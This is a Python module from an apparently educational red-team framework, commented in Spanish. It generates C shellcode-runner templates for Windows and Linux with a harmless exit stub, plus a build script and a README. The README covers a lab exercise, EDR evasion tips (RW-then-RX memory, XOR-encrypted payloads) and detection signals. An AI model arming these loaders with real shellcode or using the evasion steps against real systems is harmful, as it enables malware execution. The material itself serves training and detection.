# -*- coding: utf-8 -*-
"""
Módulo payloads/loader_gen
==========================
Genera PLANTILLAS de shellcode-runner en C (con shellcode de marcador
position-holder) y un runner de prueba en Python para LABORATORIO.

Objetivo formativo: entender cómo los loaders ejecutan shellcode en memoria
(VirtualAlloc → memcpy → ejecución) y cómo detectarlos (EDR, reglas YARA).
El shellcode incluido es INOCUO (exit syscall) y los TODO marcan dónde
colocar el payload de tu prueba autorizada.

Genera (en output/payloads/loader_<nombre>/):
    runner_windows.c   → plantilla C con VirtualAlloc/creamemoria (Win)
    runner_linux.c     → plantilla C con mmap (POSIX)
    payload_stub.h     → shellcode de ejemplo inocuo (exit)
    build.sh           → compilación de ejemplo
    README.md          → técnica, ejercicio y detección (MITRE T1055/T1027)

Riesgo: ALTO → exige AUTHORIZED.
"""

import shutil
from pathlib import Path

from core.base_module import BaseModulo, ModuloError

SALIDA_RAIZ = Path(__file__).resolve().parent.parent.parent / "output" / "payloads"

RUNNER_WIN = r"""/* runner_windows.c — Plantilla educativa de shellcode runner (REDHAVOC)
 * Técnica de referencia: Process Injection T1055 / Obfuscated T1027
 * USO SOLO EN LABORATORIO O CON AUTORIZACIÓN ESCRITA.
 */
#include <windows.h>
#include <stdio.h>
#include "payload_stub.h"

int main(void) {
    // 1) Reservar memoria RW (no RWX: buena práctica EDR-aware para el lab)
    void *buffer = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE,
                                PAGE_READWRITE);
    if (!buffer) { perror("VirtualAlloc"); return 1; }

    // TODO(lab): descifrar aquí el payload de tu prueba (XOR/AES) en vez de copiarlo plano
    memcpy(buffer, payload, sizeof(payload));

    // 2) Cambiar a RX y ejecutar (evita RWX que disparan las EDR)
    DWORD viejo = 0;
    VirtualProtect(buffer, sizeof(payload), PAGE_EXECUTE_READ, &viejo);

    ((void(*)())buffer)();
    return 0;
}
"""

RUNNER_LINUX = r"""/* runner_linux.c — Plantilla educativa de shellcode runner POSIX (REDHAVOC)
 * USO SOLO EN LABORATORIO O CON AUTORIZACIÓN ESCRITA.
 */
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include "payload_stub.h"

int main(void) {
    void *mem = mmap(NULL, sizeof(payload), PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { perror("mmap"); return 1; }

    memcpy(mem, payload, sizeof(payload));
    mprotect(mem, sizeof(payload), PROT_READ | PROT_EXEC);

    ((void(*)())mem)();
    return 0;
}
"""

PAYLOAD_STUB = r"""/* payload_stub.h — Shellcode INOCUO de marcador (REDHAVOC)
 * x86-64 Linux: exit(0) — sustitúyelo por el payload de TU prueba autorizada.
 */
#ifndef PAYLOAD_STUB_H
#define PAYLOAD_STUB_H
unsigned char payload[] = {
    0x48, 0x31, 0xff,       // xor rdi, rdi
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, // mov rax, 60 (exit)
    0x0f, 0x05              // syscall
};
#endif
"""

BUILD_SH = r"""#!/usr/bin/env bash
# build.sh — Compila los runners de laboratorio (REDHAVOC)
set -euo pipefail
gcc -o runner_linux runner_linux.c 2>/dev/null && echo "[+] runner_linux compilado"
# Windows (con mingw-w64 instalado):
# x86_64-w64-mingw32-gcc -o runner_windows.exe runner_windows.c
echo "[i] Recuerda: solo laboratorios autorizados."
"""

README = """# Shellcode Runner — Plantilla educativa (REDHAVOC)

## Técnica
Un *loader* ejecuta shellcode en memoria: reserva RW → copia/descifra →
cambia a RX → llama al buffer. Se relaciona con MITRE ATT&CK T1055
(Process Injection) y T1027 (Obfuscated Files or Information).

## Contenido
| Fichero | Propósito |
|---|---|
| `runner_windows.c` | Runner con VirtualAlloc/VirtualProtect (Win) |
| `runner_linux.c` | Runner con mmap/mprotect (POSIX) |
| `payload_stub.h` | Shellcode INOCUO de ejemplo (exit) |
| `build.sh` | Compilación de ejemplo |

## Ejercicio de laboratorio
1. Compila y ejecuta el runner POSIX con el stub inocuo.
2. Depura con gdb/ghidra y observa los permisos de página (/proc/pid/maps).
3. Sustituye el stub por shellcode de msfvenom DE TU LAB (`msfvenom -f c`).
4. Implementa cifrado XOR del payload y descifrado en memoria.

## Detección (para el informe)
- Alarmas por VirtualAlloc + VirtualProtect RWX en procesos no legítimos.
- Reglas YARA de cabeceras de shellcode (NOP sleds, syscall patterns).
- ETW/EDR: calls a memoria RWX con contenido no respaldado en disco.
- AMSI/Defender en Windows para scripts intermedios.

## Aviso legal
Uso exclusivo en laboratorio o con autorización escrita. El uso no
autorizado es delito.
"""


class LoaderGen(BaseModulo):
    """Genera plantillas de shellcode runners educativos (C, Win+Linux)."""

    NAME = "payloads/loader_gen"
    CATEGORIA = "payloads"
    DESCRIPCION = ("Genera plantillas educativas de shellcode runners en C "
                   "(Windows/Linux) con shellcode inocuo, ejercicio de lab y "
                   "guía de detección EDR. Uso autorizado.")
    RIESGO = "alto"
    AUTOR = "REDHAVOC"
    REFERENCIA = "MITRE ATT&CK T1055 · T1027"

    def definir_opciones(self) -> None:
        self.opciones.declarar("NOMBRE", "lab", False, "Sufijo del proyecto generado")

    def ejecutar(self) -> dict:
        nombre = self.opt("NOMBRE", "lab").strip().replace(" ", "_") or "lab"
        carpeta = SALIDA_RAIZ / f"loader_{nombre}"
        if carpeta.exists():
            shutil.rmtree(carpeta)
        carpeta.mkdir(parents=True)

        (carpeta / "runner_windows.c").write_text(RUNNER_WIN, encoding="utf-8")
        (carpeta / "runner_linux.c").write_text(RUNNER_LINUX, encoding="utf-8")
        (carpeta / "payload_stub.h").write_text(PAYLOAD_STUB, encoding="utf-8")
        (carpeta / "build.sh").write_text(BUILD_SH, encoding="utf-8")
        (carpeta / "README.md").write_text(README, encoding="utf-8")

        ficheros = sorted(str(p) for p in carpeta.iterdir())
        return {
            "resumen": f"Proyecto loader generado en {carpeta} ({len(ficheros)} ficheros)",
            "carpeta": str(carpeta),
            "ficheros": ficheros,
            "tecnica": "MITRE ATT&CK T1055 (injection) · T1027 (obfuscation)",
        }
